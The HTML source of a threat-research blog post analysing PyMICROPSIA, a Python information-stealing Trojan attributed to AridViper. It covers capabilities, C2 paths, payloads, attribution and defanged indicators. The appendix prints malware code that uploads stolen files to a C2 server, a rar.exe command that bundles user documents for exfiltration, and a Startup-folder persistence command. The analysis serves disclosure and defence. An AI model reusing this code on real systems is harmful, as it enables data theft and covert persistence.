
<!doctype html>
<html >
  <head>
  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="apple-touch-icon" sizes="180x180" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/apple-touch-icon.png">
	<link rel="icon" type="image/png" sizes="32x32" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/favicon-32x32.png">
	<link rel="icon" type="image/png" sizes="16x16" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/favicon-16x16.png">
	<link rel="manifest" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/site.webmanifest">
	<link rel="mask-icon" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/safari-pinned-tab.svg" color="#000000">
	<meta name="msapplication-TileColor" content="#000000">
	<meta name="theme-color" content="#000">
  <link rel="alternate" hreflang="en" href="https://unit42.paloaltonetworks.com/pymicropsia/" />

	<!-- This site is optimized with the Yoast SEO plugin v15.2.1 - https://yoast.com/wordpress/plugins/seo/ -->
	<title>PyMICROPSIA: New Information-Stealing Trojan from AridViper</title>
	<meta name="description" content="We&#039;ve identified a new information-stealing Trojan we call PyMICROPSIA, related to the previously identified MICROPSIA malware family." />
	<meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1" />
	<link rel="canonical" href="https://unit42.paloaltonetworks.com/pymicropsia/" />
	<meta property="og:locale" content="en_US" />
	<meta property="og:type" content="article" />
	<meta property="og:title" content="PyMICROPSIA: New Information-Stealing Trojan from AridViper" />
	<meta property="og:description" content="We&#039;ve identified a new information-stealing Trojan we call PyMICROPSIA, related to the previously identified MICROPSIA malware family." />
	<meta property="og:url" content="https://unit42.paloaltonetworks.com/pymicropsia/" />
	<meta property="og:site_name" content="Unit42" />
	<meta property="article:published_time" content="2020-12-14T14:00:03+00:00" />
	<meta property="article:modified_time" content="2020-12-12T00:07:06+00:00" />
	<meta property="og:image" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/12/Malware-r3d1.png" />
	<meta property="og:image:width" content="2001" />
	<meta property="og:image:height" content="1001" />
	<meta name="twitter:card" content="summary_large_image" />
	<meta name="twitter:label1" content="Written by">
	<meta name="twitter:data1" content="Unit 42">
	<meta name="twitter:label2" content="Est. reading time">
	<meta name="twitter:data2" content="18 minutes">
	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"WebSite","@id":"https://unit42.paloaltonetworks.jp/#website","url":"https://unit42.paloaltonetworks.jp/","name":"Unit42","description":"Palo Alto Networks","potentialAction":[{"@type":"SearchAction","target":"https://unit42.paloaltonetworks.jp/?s={search_term_string}","query-input":"required name=search_term_string"}],"inLanguage":"en-US"},{"@type":"ImageObject","@id":"https://unit42.paloaltonetworks.com/pymicropsia/#primaryimage","inLanguage":"en-US","url":"https://unit42.paloaltonetworks.com/wp-content/uploads/2020/12/Malware-r3d1.png","width":2001,"height":1001,"caption":"Conceptual image illustrating the concept of malware, such as PyMICROPSIA, the malware family discussed here"},{"@type":"WebPage","@id":"https://unit42.paloaltonetworks.com/pymicropsia/#webpage","url":"https://unit42.paloaltonetworks.com/pymicropsia/","name":"PyMICROPSIA: New Information-Stealing Trojan from AridViper","isPartOf":{"@id":"https://unit42.paloaltonetworks.jp/#website"},"primaryImageOfPage":{"@id":"https://unit42.paloaltonetworks.com/pymicropsia/#primaryimage"},"datePublished":"2020-12-14T14:00:03+00:00","dateModified":"2020-12-12T00:07:06+00:00","author":{"@id":"https://unit42.paloaltonetworks.jp/#/schema/person/c9f857f4a98ba37b6336f6c830489fb5"},"description":"We've identified a new information-stealing Trojan we call PyMICROPSIA, related to the previously identified MICROPSIA malware family.","inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["https://unit42.paloaltonetworks.com/pymicropsia/"]}]},{"@type":"Person","@id":"https://unit42.paloaltonetworks.jp/#/schema/person/c9f857f4a98ba37b6336f6c830489fb5","name":"Unit 42","image":{"@type":"ImageObject","@id":"https://unit42.paloaltonetworks.jp/#personlogo","inLanguage":"en-US","url":"https://unit42.paloaltonetworks.com/wp-content/uploads/2018/11/unit-news-meta.svg","caption":"Unit 42"}}]}</script>
	<!-- / Yoast SEO plugin. -->


<link rel='dns-prefetch' href='//www.google.com' />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel="alternate" type="application/rss+xml" title="Unit42 &raquo; PyMICROPSIA: New Information-Stealing Trojan from AridViper Comments Feed" href="https://unit42.paloaltonetworks.com/pymicropsia/feed/" />
<meta property="og:likes" content="3"/>
<meta property="og:readtime" content="17"/>
<meta property="og:views" content="4,137"/>
<meta property="og:date_created" content="December 14, 2020 at 6:00 AM"/>
<meta property="og:post_length" content="4550"/>
<meta property="og:category" content="Unit 42"/>
<meta property="og:category_link" content="https://unit42.paloaltonetworks.com/category/unit-42/"/>
<meta property="og:author" content="Unit 42"/>
<meta property="og:authorlink" content="https://unit42.paloaltonetworks.com/author/unit42/"/>
<meta property="og:author_image_link" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/11/unit-news-meta.svg"/>
<meta property="og:post_image" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/12/Malware-r3d1.png"/>
<script type="application/ld+json">{"@context":"https:\/\/schema.org","@type":"BlogPosting","headline":"PyMICROPSIA: New Information-Stealing Trojan from AridViper","name":"PyMICROPSIA: New Information-Stealing Trojan from AridViper","description":"We've identified a new information-stealing Trojan we call PyMICROPSIA, related to the previously identified MICROPSIA malware family. ","url":"https:\/\/unit42.paloaltonetworks.com\/pymicropsia\/","mainEntityOfPage":"https:\/\/unit42.paloaltonetworks.com\/pymicropsia\/","datePublished":"December 14, 2020","articleBody":"Executive Summary\r\nUnit 42 researchers have been tracking the threat group AridViper, which has been targeting the Middle Eastern region. As part of this research, a new information-stealing Trojan with relations to the MICROPSIA malware family has been identified, showing that the actor maintains a very active development profile, creating new implants that seek to bypass the defenses of their targets. We have named this new malware family PyMICROPSIA because it is built with Python.\r\n\r\nFigure 1 below provides a high-level overview of the capabilities of the PyMICROPSIA malware family and similarities observed with previous AridViper activity. While investigating PyMICROPSIA capabilities, we identified two additional samples hosted in the attacker\u2019s infrastructure, which are downloaded and used by PyMICROPSIA during its deployment. The additional samples provide persistence and keylogging capabilities, which we discuss later.\r\n\r\n[caption id=\"attachment_110158\" align=\"aligncenter\" width=\"900\"] Figure 1. PyMICROPSIA overview.[\/caption]\r\n\r\nIn this blog, we will detail the functionality and objectives of PyMICROPSIA and analyze its command and control (C2) implementation. We will also highlight the main observations that allow us to attribute PyMICROPSIA to previous AridViper activity.\r\n\r\nPalo Alto Networks Next-Generation Firewall customers are protected from the attacks outlined in this blog with WildFire, URL Filtering and DNS Security subscriptions. Customers are also protected with AutoFocus and Cortex XDR.\r\nPyMICROPSIA Analysis\r\nPyMICROPSIA has a rich set of information-stealing and control capabilities, including:\r\n\r\n \tFile uploading.\r\n \tPayload downloading and execution.\r\n \tBrowser credential stealing. Clearing browsing history and profiles.\r\n \tTaking screenshots.\r\n \tKeylogging.\r\n \tCompressing RAR files for stolen information.\r\n \tCollecting process information and killing processes.\r\n \tCollecting file listing information.\r\n \tDeleting files.\r\n \tRebooting machine.\r\n \tCollecting Outlook .ost file. Killing and disabling Outlook process.\r\n \tDeleting, creating, compressing and exfiltrating files and folders.\r\n \tCollecting information from USB drives, including file exfiltration.\r\n \tAudio recording.\r\n \tExecuting commands.\r\n\r\nImplementation Overview\r\nPyMICROPSIA is an information-stealing Trojan built with Python and made into a Windows executable using PyInstaller.\r\n\r\n[caption id=\"attachment_110160\" align=\"aligncenter\" width=\"900\"] Figure 2. PyInstaller strings in PyMICROPSIA.[\/caption]\r\n\r\nIt implements its main functionality by running a loop, where it initializes different threads and calls several tasks periodically with the intent of collecting information and interacting with the C2 operator.\r\n\r\n[caption id=\"attachment_110162\" align=\"aligncenter\" width=\"900\"] Figure 3. Main code loop.[\/caption]\r\n\r\nThe actor makes use of several interesting Python libraries to achieve its purposes, including both built-in Python libraries and specific packages. Some examples of information-stealing specific libraries are:\r\n\r\n \tPyAudio, for audio stealing capabilities.\r\n \tmss, for screenshot capabilities.\r\n\r\n[caption id=\"attachment_110164\" align=\"aligncenter\" width=\"900\"] Figure 4. PyAudio library for audio recording.[\/caption]\r\n\r\n[caption id=\"attachment_110166\" align=\"aligncenter\" width=\"900\"] Figure 5. mss library for screenshots.[\/caption]\r\n\r\nThe usage of Python built-in libraries is expected for multiple purposes, such as interacting with Windows processes, Windows registry, networking, file system and so on.\r\n\r\n[caption id=\"attachment_110168\" align=\"aligncenter\" width=\"900\"] Figure 6. Windows Registry interaction.[\/caption]\r\n\r\n[caption id=\"attachment_110170\" align=\"aligncenter\" width=\"900\"] Figure 7. Windows processes interaction.[\/caption]\r\n\r\nFor more specific interactions with the Windows operating system, it makes use of libraries such as:\r\n\r\n \tWMI, for interaction with Windows Management Instrumentation.\r\n \twin32security and ntsecuritycon, for interaction with the win32security API.\r\n\r\n[caption id=\"attachment_110172\" align=\"aligncenter\" width=\"894\"] Figure 8. WMI usage for USB interaction.[\/caption]\r\n\r\n[caption id=\"attachment_110174\" align=\"aligncenter\" width=\"900\"] Figure 9. win32security and ntsecuritycon usage.[\/caption]\r\n\r\nAn in-depth analysis of the code and capabilities of PyMICROPSIA can be found in the Appendix.\r\nCommand and Control\r\nPyMICROPSIA implements a simple HTTP POST-based C2 protocol, using different Uniform Resource Identifier (URI) paths and variables during the communication depending on the functionality invoked (full details on the implementation can be found in the Appendix).\r\n\r\nThe following table summarizes the URI paths and corresponding functionality in PyMICROPSIA:\r\n\r\n\r\n\r\nPath\r\nMethod\r\n\r\n\r\n\/zoailloaze\/sfuxmiibif\/samantha\r\nDelete request. Unregister.\r\n\r\n\r\n\/zoailloaze\/sfuxmiibif\/lashawna\r\nDevice registration.\r\n\r\n\r\n\/zoailloaze\/sfuxmiibif\/matheny\r\nSend command output data.\r\n\r\n\r\n\/zoailloaze\/sfuxmiibif\/uiasfvz\r\nUSB device information\r\n\r\n\r\n\/zoailloaze\/sfuxmiibif\/daryl\r\nDelete request.\r\n\r\n\r\n\/zoailloaze\/sfuxmiibif\/qprbudls\r\nDownload payload.\r\n\r\n\r\n\/zoailloaze\/sfuxmiibif\/nyrvoz\r\nDownload URL.\r\n\r\n\r\n\/zoailloaze\/sfuxmiibif\/hortense1\r\nUpload file.\r\n\r\n\r\n\r\nTable 1. Main purpose of configuration folders and files. \r\nIt's also important to note that in the PyMICROPSIA samples analyzed, the C2-related code shows several code branches that will never be executed when responses are processed, likely because the actor is still actively working on the code. Based on the code sections that are reachable, the following table summarizes the commands and actions performed on the victim machine:\r\n\r\n\r\n\r\nCommand\r\nAction\r\n\r\n\r\nLee\r\nRegister new device.\r\n\r\n\r\nRenee\r\nDelete device.\r\n\r\n\r\nRapunzel\r\nSteal and upload browser credentials to C2.\r\n\r\n\r\nMulan\r\nCollect and upload process list.\r\n\r\n\r\nSilverman\r\nCollect and upload file information in TXT format.\r\n\r\n\r\nEeyore\r\nDelete Firefox profiles and de-register device.\r\n\r\n\r\nPocahontas\r\nCollect and upload compressed file information in JSON detailed format.\r\n\r\n\r\nInfoCinder\r\nCollect and upload information regarding drives in the system.\r\n\r\n\r\n\r\nTable 2. Reachable C2 commands and actions.\r\n\r\nIs AridViper Working on New Attack Vectors?\r\nPyMICROPSIA is designed to target Windows operating systems only, but the code contains interesting snippets checking for other operating systems, such as \u201cposix\u201d or \u201cdarwin\u201d. This is an interesting finding, as we have not witnessed AridViper targeting these operating systems before and this could represent a new area the actor is starting to explore.\r\n\r\n[begin code]\r\n\u00a0 \u00a0 \u00a0else:\r\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0if os.name == 'posix' and sys.platform == 'darwin':\r\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0PathName = os.getenv('HOME') + '\/Library\/Application Support\/Google\/Chrome\/Default\/'\r\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0if os.path.isdir(PathName) == False:\r\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0sys.exit(0)\r\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0elif os.name == 'posix':\r\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0PathName = os.getenv('HOME') + '\/.config\/google-chrome\/Default\/'\r\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0if os.path.isdir(PathName) == False:\r\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0sys.exit(0)\r\n\u00a0 \u00a0 \u00a0return PathName\r\n[end code]\r\n\r\nFor now, the code found is very simple, and could be part of a copy and paste effort when building the Python code, but in any case, we plan to keep it on our radar while researching new activity.\r\nAdditional Payloads\r\nDuring the C2 interactions, PyMICROPSIA downloads two additional samples that are dropped and executed on the victim\u2019s system, running additional functionality. These payloads are not Python \/ PyInstaller based.\r\nKeyLogger functionality\r\nThis is a very interesting case, as the keylogging functionality hasn\u2019t been implemented natively as part of PyMICROPSIA. Instead, the sample downloads a specific payload (see the section on File Download Capabilities in the Appendix for details on how the payload is downloaded).\r\n\r\nThe payload is downloaded with filename \u201cMetroIntelGenericUIFram.exe\u201d and has the following SHA-256:\r\n\r\n381b1efca980dd744cb8d36ad44783a35d01a321593a4f39a0cdae9c7eeac52f\r\n\r\nThe sample implements keylogging capabilities using the GetAsyncKeyState API method:\r\n\r\n[caption id=\"attachment_110176\" align=\"aligncenter\" width=\"830\"] Figure 10. Keylogger GetAsyncKey() code.[\/caption]\r\n\r\nIt has a hardcoded configuration directly related to the directory structure initialized by the main PyMICROPSIA sample, so it needs to be compiled according to it. It needs to run under a specific directory created by PyMICROPSIA (\u201cModelsControllerLibb\u201d), and will store keystroke information under the \u201cHPFusionManagerDell\u201d folder.\r\n\r\n[caption id=\"attachment_110178\" align=\"aligncenter\" width=\"874\"] Figure 11. Hardcoded configuration parameters.[\/caption]\r\n\r\nThe keylogger drops information into the HPFusionManagerDell directory with the following filename structure and format:\r\n\r\n[caption id=\"attachment_110180\" align=\"aligncenter\" width=\"788\"] Figure 12. Keylogger output file format.[\/caption]\r\n\r\n[caption id=\"attachment_110182\" align=\"aligncenter\" width=\"628\"] Figure 13. Keylogger file content structure.[\/caption]\r\nPersistence\r\nPersistence in this malware sample can be achieved via regular methods, such as setting up registry keys, which is done as part of the Python code as follows:\r\n\r\n[caption id=\"attachment_110184\" align=\"aligncenter\" width=\"900\"] Figure 14. Registry key persistence.[\/caption]\r\n\r\nHowever, there is something interesting about persistence in this implementation. The sample downloads another payload from the C2 server (see the File Download Capabilities section for more details). This payload is named \u201cSynLocSynMomentum.exe\u201d, with the following SHA-256:\r\n\r\n9c32fdf5af8b86049abd92561b3d281cb9aebf57d2dfef8cc2da59df82dca753\r\n\r\nThe sample is executed with specific parameters:\r\n\r\nSynLocSynMomentum.exe ModelsControllerLibb ModelsControllerLib\r\n\r\nIt sets up persistence via the shortcut .lnk copied to the startup menu. It's striking that this code is run as a separate payload considering the amount of functionality already present in the Python code.\r\n\r\n\"C:\\Windows\\System32\\cmd.exe\" \/c move\r\n\"C:\\Users\\admin\\AppData\\Local\\Temp\\\\ModelsControllerLib.lnk\"\r\n\"C:\\Users\\admin\\AppData\\Roaming\\Microsoft\\Windows\\Start\r\nMenu\\Programs\\Startup\\ModelsControllerLib.lnk\"\r\nRelations With Other MICROPSIA Activity\r\nWe unearthed PyMICROPSIA while investigating recent MICROPSIA activity related to the Middle Eastern region, and there are multiple aspects of the malware that link the activity to AridViper, including the following examples.\r\nCode Overlaps\r\nOne of the first things that caught our attention regarding this sample was the C2 implementation and capabilities, which are quite similar to known MICROPSIA samples. For example, see the C2 descriptions in previous research by Radware and Check Point.\r\n\r\nAlso, one of the tactics, techniques and procedures (TTPs) observed across MICROPSIA samples is the use of rar.exe to compress data for exfiltration. In this version, rar.exe is downloaded from the C2 infrastructure and used with very similar parameters as observed in previous samples:\r\n\r\n[begincode]\r\nk24 = '\"' + Wv + '\\\\*.dot' + '\" '\r\nk25 = '\"' + Wv + '\\\\*.dotx' + '\" '\r\nAllFile = k1 + k2 + k3 + k4 + k5 + k6 + k7 + k8 + k9 + k11 + k12 + k13 + k14 + k15 + k16 + k17 + k18 + k19 + k20 + k21 + k22 + k23 + k24 + k25\r\nAllFiles_Drvi = AllFile\r\nflTDType = AllFiles_Drvi\r\nte = file_D\r\nEn_crpypt2 = 'a -r -ep1 -v2.5m -ta' + te + ' -hp'\r\nEn = '4545933464930447517744759'\r\nmm = chick_Device_Name() + En\r\nnnWithoutdel = En_crpypt2 + mm\r\nsubprocess.call('\"' + Rar_File + '\"' + ' ' + (nnWithoutdel + ' ' + '\"' + Zip_File2 + '_NETWORKWTHDate\"' + ' ' + flTDType), shell=True)\r\n[end code]\r\n\r\nFor example, see how one recent sample of MICROPSIA makes use of rar.exe.\r\n\r\nSHA-256: 3c8979740d2f634ff2c0c0ab7adb78fe69d6d42307118d0bb934f03974deddac\r\n[begin code]\r\n\"C:\\Program Files\\WinRAR\\Rar.exe\" a -r -ep1 -v2500k -hpcec6b597e046386f74b807c60ada61a5_d01247a1eaf1c24ffbc851e883e67f9b -ta2020-10-21 \"C:\\ProgramData\\commonlogfiles\\LMth_C\" \"C:\\Users\\admin\\*.xls\" \"C:\\Users\\admin\\*.xlsx\" \"C:\\Users\\admin\\*.doc\" \"C:\\Users\\admin\\*.docx\" \"C:\\Users\\admin\\*.csv\" \"C:\\Users\\admin\\*.pdf\" \"C:\\Users\\admin\\*.ppt\" \"C:\\Users\\admin\\*.pptx\" \"C:\\Users\\admin\\*.odt\" \"C:\\Users\\admin\\*.mdb\" \"C:\\Users\\admin\\*.accdb\" \"C:\\Users\\admin\\*.accde\" \"C:\\Users\\admin\\*.txt\" \"C:\\Users\\admin\\*.rtf\"\r\n[end code]\r\nC2 Communication Similarity\r\nThe URI path structures observed in multiple MICROPSIA samples follow a similar structure to the ones in the PyMICROPSIA samples. For example, if we look into the same recent MICROPSIA sample, we can observe the random characters and structure of the URI paths.\r\n\r\nSHA-256:\r\n3c8979740d2f634ff2c0c0ab7adb78fe69d6d42307118d0bb934f03974deddac\r\n\r\nhxxps:\/\/jaime-martinez[.]info\/sujqbrgpb\/bztjpskd\/rxkwjt\r\nhxxps:\/\/jaime-martinez[.]info\/sujqbrgpb\/bztjpskd\/zxfsyadoss\/gM69sY\r\nhxxp:\/\/jaime-martinez[.]info\/sujqbrgpb\/bztjpskd\/tpmpyyzwg\r\nhxxps:\/\/jaime-martinez[.]info\/sujqbrgpb\/bztjpskd\/ouwmhf\/ImoOEJ\r\nhxxp:\/\/jaime-martinez[.]info\/sujqbrgpb\/bztjpskd\/ouwmhf\/voT8FY\r\nhxxp:\/\/jaime-martinez[.]info\/sujqbrgpb\/bztjpskd\/rxkwjt\r\nhxxp:\/\/jaime-martinez[.]info\/sujqbrgpb\/bztjpskd\/zxfsyadoss\/TocLI5\r\nhxxps:\/\/jaime-martinez[.]info\/sujqbrgpb\/bztjpskd\/ouwmhf\/9WnKfe\r\nhxxp:\/\/jaime-martinez[.]info\/sujqbrgpb\/bztjpskd\/zxfsyadoss\/pyPaqj\r\nhxxps:\/\/jaime-martinez[.]info\/sujqbrgpb\/bztjpskd\/ouwmhf\/HRabCX\r\nThemes Used\r\nIn the past, we have seen references in MICROPSIA to specific themes when it comes to code and C2 implementation, such as The Big Bang Theory or Game of Thrones, and this new implementation is not different, including multiple references to multiple famous actor names, both in code variables as well as in infrastructure used, as can be seen in Figures 15 and 16.\r\n\r\n[caption id=\"attachment_110186\" align=\"aligncenter\" width=\"788\"] Figure 15. MICROPSIA is known for referencing themes in code, such as The Big Bang Theory and Game of Thrones. The reference to the actor Fran Drescher shown above seems in line with previous observations of themes.[\/caption]\r\n\r\n[caption id=\"attachment_110188\" align=\"aligncenter\" width=\"900\"] Figure 16. MICROPSIA is known for referencing themes in code, such as The Big Bang Theory and Game of Thrones. The reference to the actor Keanu Reeves shown above seems in line with previous observations of themes.[\/caption]\r\n\r\nAlso, as described in the Command and Control section, the C2 operations contain a lot of Disney references.\r\n\r\nAnother interesting detail is the presence of Arabic comments in the code:\r\n\r\n[begin code]\r\nDelete_Request_Error('\u0644\u0645 \u064a\u062a\u0645 \u0636\u063a\u0637 \u0647\u0630\u0627 \u0627\u0644\u0645\u0644\u0641!!..')\r\n[end code]\r\n\r\nThis could be a false flag, but it is another possible link to the regional attribution of this malware sample.\r\nConclusion\r\nAridViper is an active threat group that continues developing new tools as part of their arsenal. PyMICROPSIA shows multiple overlaps with other existing AridViper tools such as MICROPSIA. Also, based on different aspects of PyMICROPSIA that we analyzed, several sections of the malware are still not used, indicating that it is likely a malware family under active development by this actor.\r\n\r\nPalo Alto Networks customers are protected from the attacks outlined in this blog in the following ways:\r\n\r\n \tAll known AridViper tools, including MICROPSIA and PyMICROPSIA, have malicious verdicts in WildFire.\r\n \tAutoFocus customers can track the AridViper actor and its tools.\r\n \tCortex XDR blocks both PyMICROPSIA and the dropped payloads.\r\n \tC2 domains have been categorized as Command and Control in URL Filtering and DNS Security.\r\n\r\nIndicators of Compromise\r\nPyMICROPSIA Samples\r\n11487246a864ee0edf2c05c5f1489558632fb05536d6a599558853640df8cd78\r\n\r\nddaeffb12a944a5f4d47b28affe97c1bc3a613dab32e5b5b426ef249cfc29273\r\n\r\n46dae9b27f100703acf5b9fda2d1b063cca2af0d4abeeccc6cd45d12be919531\r\nMICROPSIA Samples\r\n47d53f4ab24632bf4ca34e9a10e11b4b6c48a242cbcfcb1579d67523463e59d2\r\n\r\n83e0db0fa3feaf911a18c1e2076cc40ba17a185e61623a9759991deeca551d8b\r\n\r\neab20d4c0eeff48e7e1b6b59d79cd169cac277aeb5f91f462f838fcd6835e0ac\r\n\r\n078212fc6d69641e96ed04352fba4d028fd5eadc87c7a4169bfbcfc52b8ef8f2\r\n\r\n0d65b9671e51baf64e1389649c94f2a9c33547bfe1f5411e12c16ae2f2f463dd\r\n\r\n2115d02ead5e497ce5a52ab9b17f0e007a671b3cd95aa55554af17d9a30de37c\r\n\r\n26253e9027f798bafc4a70bef1b5062f096a72b0d7af3065b0f4a9b3be937c99\r\n\r\n3884ac554dcd58c871a4e55900f8847c9e308a79c321ae46ced58daa00d82ab4\r\n\r\n3c8979740d2f634ff2c0c0ab7adb78fe69d6d42307118d0bb934f03974deddac\r\n\r\n3da95f33b6feb5dcc86d15e2a31e211e031efa2e96792ce9c459b6b769ffd6a4\r\n\r\n42fa99e574b8ac5eddf084a37ef891ee4d16742ace9037cda3cdf037678e7512\r\n\r\n4eced949a2da569ee9c4e536283dabad49e2f41371b6e8d40b80a79ec1b0e986\r\n\r\n5b8b71d1140beaae4736eb58adc64930613ebeab997506fbb09aabff68242e17\r\n\r\n82ad34384fd3b37f85e735a849b033326d8ce907155f5ff2d24318b1616b2950\r\n\r\na60cadbf6f5ef8a2cbb699b6d7f072245c8b697bbad5c8639bca9bb55f57ae65\r\n\r\nb0562b41552a2fa744390a5f79a843940dade57fcf90cd23187d9c757dc32c37\r\n\r\nb61fa79c6e8bfcb96f6e2ed4057f5a835a299e9e13e4c6893c3c3309e31cad44\r\n\r\nd28ab0b04dc32f1924f1e50a5cf864325c901e11828200629687cca8ce6b2d5a\r\n\r\ndb1c2482063299ba5b1d5001a4e69e59f6cc91b64d24135c296ec194b2cab57a\r\n\r\ne869c7f981256ddb7aa1c187a081c46fed541722fa5668a7d90ff8d6b81c1db6\r\n\r\neda6d901c7d94cbd1c827dfa7c518685b611de85f4708a6701fcbf1a3f101768\r\n\r\nAridViper Infrastructure\r\n\r\nbaldwin-gonzalez[.]live\r\n\r\njaime-martinez[.]info\r\n\r\njudystevenson[.]info\r\n\r\nrobert-keegan[.]life\r\n\r\nbenyallen[.]club\r\n\r\nchad-jessie[.]info\r\n\r\nescanor[.]live\r\n\r\nkrasil-anthony[.]icu\r\n\r\nnicoledotson[.]icu\r\n\r\nsamwinchester[.]club\r\n\r\ntatsumifoughtogre[.]club\r\nAPPENDIX: PyMYCROPSIA Malware Analysis\r\nThe following PyMICROPSIA analysis is based on the following sample:\r\n\r\nSHA-256: 46dae9b27f100703acf5b9fda2d1b063cca2af0d4abeeccc6cd45d12be919531\r\nMalware Initialization\r\nEnvironment and Configuration\r\nAs part of the malware initialization, it's important to highlight two main aspects of PyMICROPSIA:\r\n\r\n \tCreates multiple folders with different purposes.\r\n \tDefines a list of C2 servers.\r\n\r\n[caption id=\"attachment_110190\" align=\"aligncenter\" width=\"900\"] Figure 17. Directory structure during initialization.[\/caption]\r\n\r\nThe main purpose for each of the files and folders defined in the initial malware configuration is summarized in the following table:\r\n\r\n\r\n\r\nDirectory\r\nPurpose\r\n\r\n\r\nRar_com_Folder\r\nStorage for RAR compressed information.\r\n\r\n\r\nDevName\r\nStorage for RAR compressed information.\r\n\r\n\r\nDevNameSound\r\nStorage for audio recorded files.\r\n\r\n\r\nDevNameKeyPress\r\nStorage for keylogger output information.\r\n\r\n\r\nMyFolderName\r\nMultipurpose folder. Stores configuration, output with information collected, etc.\r\n\r\n\r\ndownloadNameApp\r\nFilename for applications downloaded from the C2.\r\n\r\n\r\nNameApps\r\nFilename for applications downloaded from the C2.\r\n\r\n\r\nNameAppShurt\r\nFilename for shortcut created for persistence.\r\n\r\n\r\n\r\nTable 3. Main purpose of configuration folders and files.\r\n\r\nDevice Identifier\r\nDevices are identified based on a combination of computer name, username and a randomly generated code. Once the code is generated, it\u2019s stored under the multipurpose folder \u201cMyFolderName\u201d.\r\n\r\n[caption id=\"attachment_110192\" align=\"aligncenter\" width=\"900\"] Figure 18. Initialization of device name.[\/caption]\r\n\r\nThis identifier function will be used during C2 communications to keep track of the target.\r\nC2 Selection\r\nFrom a network perspective, the malware picks up a C2 server from the configured list based on a connectivity test via a POST request to a specific path:\r\n\r\n[caption id=\"attachment_110194\" align=\"aligncenter\" width=\"900\"] Figure 19. Network C2 selection.[\/caption]\r\n\r\nIt then stores the resulting selected domain under the \u201cMyFolderName\u201d multipurpose folder.\r\n\r\n[caption id=\"attachment_110196\" align=\"aligncenter\" width=\"900\"] Figure 20. Selected domain configuration storage.[\/caption]\r\nMain Activity Loop\r\nOnce the initial setup is complete, the malware capabilities start by entering into a loop (see Figure 3) where:\r\n\r\n \tSeveral independent threads for audio recording and file uploading are started.\r\n \tSpecific tasks are run periodically, covering the following main areas: persistence, keylogging, screenshots and interaction with the C2 operator.\r\n\r\nC2 Implementation\r\nProtocol Implementation\r\nThe protocol implemented is simple. Messages are sent via HTTP POST requests, using different URI paths and variables depending on the functionality invoked.\r\n\r\nFor example, when a file is uploaded, an HTTP POST request is built as follows:\r\n\r\n[begin code]\r\ndef Upload_File(type, path, FranDrescher, NB):\r\n\u00a0 \u00a0if not os.path.exists(path):\r\n\u00a0 \u00a0 \u00a0 \u00a0 return True\r\n\u00a0 \u00a0url = FranDrescher + '\/zoailloaze\/sfuxmiibif\/hortense1'\r\n\u00a0 \u00a0datei_hochladen = open(path, 'rb')\r\n\u00a0 \u00a0files = {'terrell': datei_hochladen}\r\n\u00a0 \u00a0status = False\r\n\u00a0 \u00a0while not status:\r\n\u00a0 \u00a0 \u00a0 \u00a0try:\r\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0ur = requests.post(url, files=files, data={'beau': name_device + ';' + str(NB), 'type': type, 'FComp': str(NumComPers())})\r\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0if ur.text == 'true':\r\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0status = True\r\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0datei_hochladen.close()\r\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0os.remove(path)\r\n[end code]\r\n\r\nThis request contains:\r\n\r\n \tURI Path: '\/zoailloaze\/sfuxmiibif\/hortense1'\r\n \tMultipart encoded files, under \u201cterrel\u201d variable.\r\n \tForm-encoded data, using \u2018beau\u2019, \u2018type\u2019 and \u2018FComp\u2019 variables.\r\n \tSome parameters can contain multiple components, such as \u2018beau\u2019 in this case, and they are split with the use of \u2018;\u2019.\r\n\r\nWhen responses are received, if they contain operations to execute, they are sent via strings with components split with \u2018;\u2019 as delimiter. For example, the following code snippet shows the communication with the C2 operator and how it treats the response (only some interesting portions are shown for brevity):\r\n\r\n[begin code]\r\nur = requests.post(url, data={'beau': name_device + ';' + str(getLastModDir(4))})\r\n\u00a0 \u00a0resArr = ur.text\r\n\u00a0 \u00a0Im_extin = resArr.split(';')[0]\r\n\u00a0 \u00a0if ur.status_code == 200:\r\n\u00a0 \u00a0 \u00a0 if resArr == 'Lee':\r\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0register_new_device(FranDrescher)\r\n\u00a0 \u00a0 \u00a0 elif resArr == 'Melissa':\r\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0pass\r\n\u00a0 \u00a0 \u00a0 elif resArr == 'Renee':\r\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0status = Delete_Request(Im_extin)\r\n\u00a0 \u00a0 \u00a0 elif resArr == 'nero':\r\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0pass\r\n\u00a0 \u00a0 \u00a0 else:\r\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0Im_extintion = 